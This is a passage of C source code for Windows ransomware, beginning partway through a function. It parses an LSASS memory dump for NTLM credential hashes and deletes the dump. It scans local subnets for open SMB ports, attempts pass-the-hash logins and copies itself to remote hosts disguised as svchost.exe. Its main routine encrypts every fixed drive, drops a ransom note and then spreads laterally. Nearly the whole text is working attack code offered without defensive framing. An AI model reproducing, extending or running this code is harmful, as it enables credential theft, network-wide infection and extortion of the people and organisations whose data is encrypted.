    HANDLE hFile = CreateFileA(DUMP_FILE_PATH, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == 0) {
        CloseHandle(hFile);
        return FALSE;
    }
    
    BYTE *fileBuffer = (BYTE*)malloc(fileSize);
    if (!fileBuffer) {
        CloseHandle(hFile);
        return FALSE;
    }
    
    DWORD bytesRead;
    if (!ReadFile(hFile, fileBuffer, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        free(fileBuffer);
        CloseHandle(hFile);
        return FALSE;
    }
    
    CloseHandle(hFile);
    
    *credential_count = 0;
    
    *credential_count = parse_lsa_blob_structures(fileBuffer, fileSize, credentials, MAX_CREDENTIALS);
    
    if (*credential_count < MAX_CREDENTIALS * 0.8) {
        int additional = find_unicode_strings(fileBuffer, fileSize, 
                                            credentials + *credential_count, 
                                            MAX_CREDENTIALS - *credential_count);
        *credential_count += additional;
    }
    
    if (*credential_count < MAX_CREDENTIALS * 0.8) {
        int additional = find_frequent_hashes(fileBuffer, fileSize, 
                                            credentials + *credential_count, 
                                            MAX_CREDENTIALS - *credential_count);
        *credential_count += additional;
    }
    
    free(fileBuffer);
    DeleteFileA(DUMP_FILE_PATH);
    
    return (*credential_count > 0);
}

BOOL scan_network(TARGET_INFO *targets, int *target_count) {
    PIP_ADAPTER_INFO pAdapterInfo;
    PIP_ADAPTER_INFO pAdapter = NULL;
    DWORD dwRetVal = 0;
    ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
    WSADATA wsaData;
    
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return FALSE;
    }
    
    pAdapterInfo = (IP_ADAPTER_INFO *)malloc(sizeof(IP_ADAPTER_INFO));
    if (pAdapterInfo == NULL) {
        WSACleanup();
        return FALSE;
    }
    
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
        free(pAdapterInfo);
        pAdapterInfo = (IP_ADAPTER_INFO *)malloc(ulOutBufLen);
        if (pAdapterInfo == NULL) {
            WSACleanup();
            return FALSE;
        }
    }
    
    *target_count = 0;
    
    if ((dwRetVal = GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) == NO_ERROR) {
        pAdapter = pAdapterInfo;
        while (pAdapter && *target_count < MAX_TARGETS) {
            IP_ADDR_STRING *pIpAddress = &pAdapter->IpAddressList;
            while (pIpAddress && *target_count < MAX_TARGETS) {
                char *ip = pIpAddress->IpAddress.String;
                char subnet[16];
                StringCchCopyA(subnet, sizeof(subnet), ip);
                
                char *lastDot = strrchr(subnet, '.');
                if (lastDot) {
                    *lastDot = 0;
                    
                    for (int i = 0; i <= 254 && *target_count < MAX_TARGETS; i++) {
                        sprintf_s(targets[*target_count].ip, sizeof(targets[*target_count].ip), "%s.%d", subnet, i);
                        
                        if (strcmp(targets[*target_count].ip, ip) != 0) {
                            targets[*target_count].smb_open = FALSE;
                            (*target_count)++;
                        }
                    }
                    
                    for (int i = 0; i < *target_count; i++) {
                        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                        if (sock != INVALID_SOCKET) {
                            sockaddr_in server;
                            server.sin_family = AF_INET;
                            server.sin_port = htons(445);
                            inet_pton(AF_INET, targets[i].ip, &server.sin_addr);
                            
                            u_long mode = 1;
                            ioctlsocket(sock, FIONBIO, &mode);
                            
                            connect(sock, (sockaddr*)&server, sizeof(server));
                            
                            fd_set set;
                            FD_ZERO(&set);
                            FD_SET(sock, &set);
                            
                            timeval timeout;
                            timeout.tv_sec = 0;
                            timeout.tv_usec = NETWORK_TIMEOUT * 1000;
                            
                            if (select(0, NULL, &set, NULL, &timeout) > 0) {
                                targets[i].smb_open = TRUE;
                            }
                            
                            closesocket(sock);
                        }
                    }
                }
                pIpAddress = pIpAddress->Next;
            }
            pAdapter = pAdapter->Next;
        }
    }
    
    free(pAdapterInfo);
    WSACleanup();
    return (*target_count > 0);
}

BOOL attempt_pth_attack(const char *target_ip, const char *username, const BYTE *ntlm_hash) {
    CredHandle hCred;
    SecHandle hCtxt;
    SEC_WINNT_AUTH_IDENTITY authIdentity;
    TimeStamp tsExpiry;
    SecBufferDesc secBufferDesc;
    SecBuffer secBuffer;
    ULONG fContextAttr;
    SECURITY_STATUS status;
    
    ZeroMemory(&authIdentity, sizeof(authIdentity));
    authIdentity.User = (unsigned char*)username;
    authIdentity.UserLength = strlen(username);
    authIdentity.Domain = (unsigned char*)"";
    authIdentity.DomainLength = 0;
    authIdentity.Password = (unsigned char*)ntlm_hash;
    authIdentity.PasswordLength = 16;
    authIdentity.Flags = SEC_WINNT_AUTH_IDENTITY_ANSI;
    
    status = AcquireCredentialsHandleA(
        NULL,
        "NTLM",
        SECPKG_CRED_OUTBOUND,
        NULL,
        &authIdentity,
        NULL,
        NULL,
        &hCred,
        &tsExpiry
    );
    
    if (status != SEC_E_OK) return FALSE;
    
    secBufferDesc.ulVersion = SECBUFFER_VERSION;
    secBufferDesc.cBuffers = 1;
    secBufferDesc.pBuffers = &secBuffer;
    secBuffer.cbBuffer = 0;
    secBuffer.BufferType = SECBUFFER_TOKEN;
    secBuffer.pvBuffer = NULL;
    
    char targetName[256];
    sprintf_s(targetName, sizeof(targetName), "cifs/%s", target_ip);
    
    do {
        status = InitializeSecurityContextA(
            &hCred,
            NULL,
            targetName,
            ISC_REQ_CONFIDENTIALITY | ISC_REQ_REPLAY_DETECT | ISC_REQ_CONNECTION,
            0,
            SECURITY_NETWORK_DREP,
            NULL,
            0,
            &hCtxt,
            &secBufferDesc,
            &fContextAttr,
            &tsExpiry
        );
        
        if (status != SEC_I_CONTINUE_NEEDED && status != SEC_E_OK) {
            break;
        }
    } while (status == SEC_I_CONTINUE_NEEDED);
    
    if (status == SEC_E_OK) {
        DeleteSecurityContext(&hCtxt);
        FreeCredentialsHandle(&hCred);
        return TRUE;
    }
    
    if (status != SEC_E_OK) {
        DeleteSecurityContext(&hCtxt);
    }
    
    FreeCredentialsHandle(&hCred);
    return FALSE;
}

BOOL deploy_to_target(const char *target_ip) {
    char currentPath[MAX_PATH];
    char targetPath[MAX_PATH];
    char command[MAX_PATH * 2];
    
    GetModuleFileNameA(NULL, currentPath, sizeof(currentPath));
    
    sprintf_s(targetPath, sizeof(targetPath), "\\\\%s\\C$\\Windows\\Temp\\svchost.exe", target_ip);
    
    if (!CopyFileA(currentPath, targetPath, FALSE)) return FALSE;
    
    sprintf_s(command, sizeof(command), "\\\\%s\\C$\\Windows\\Temp\\svchost.exe", target_ip);
    
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    if (!CreateProcessA(
        NULL,
        command,
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        return FALSE;
    }
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    return TRUE;
}

BOOL spread_laterally() {
    CREDENTIAL credentials[MAX_CREDENTIALS];
    int credential_count = 0;
    TARGET_INFO targets[MAX_TARGETS];
    int target_count = 0;
    
    if (!dump_lsass_hashes()) return FALSE;
    
    if (!parse_lsass_dump(credentials, &credential_count)) return FALSE;
    
    if (!scan_network(targets, &target_count)) return FALSE;
    
    for (int i = 0; i < target_count; i++) {
        if (targets[i].smb_open) {
            for (int j = 0; j < credential_count; j++) {
                if (attempt_pth_attack(targets[i].ip, credentials[j].username, credentials[j].ntlm_hash)) {
                    deploy_to_target(targets[i].ip);
                    break;
                }
            }
        }
    }
    
    return TRUE;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    ENCRYPTION_KEY key;
    char drives[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    char drivePath[4] = {0};
    int i;
    
    if (!get_decryption_key_from_github(&key)) {
        return 1;
    }
    
    for (i = 0; i < 26; i++) {
        drivePath[0] = drives[i];
        drivePath[1] = ':';
        drivePath[2] = '\\';
        drivePath[3] = 0;
        
        if (GetDriveTypeA(drivePath) == DRIVE_FIXED) {
            if (!encrypt_directory(drivePath, &key)) {
                continue;
            }
        }
    }
    
    if (!create_ransom_note()) {
        return 1;
    }
    
    display_ransomware_screen();
    
    spread_laterally();
    
    return 0;
}
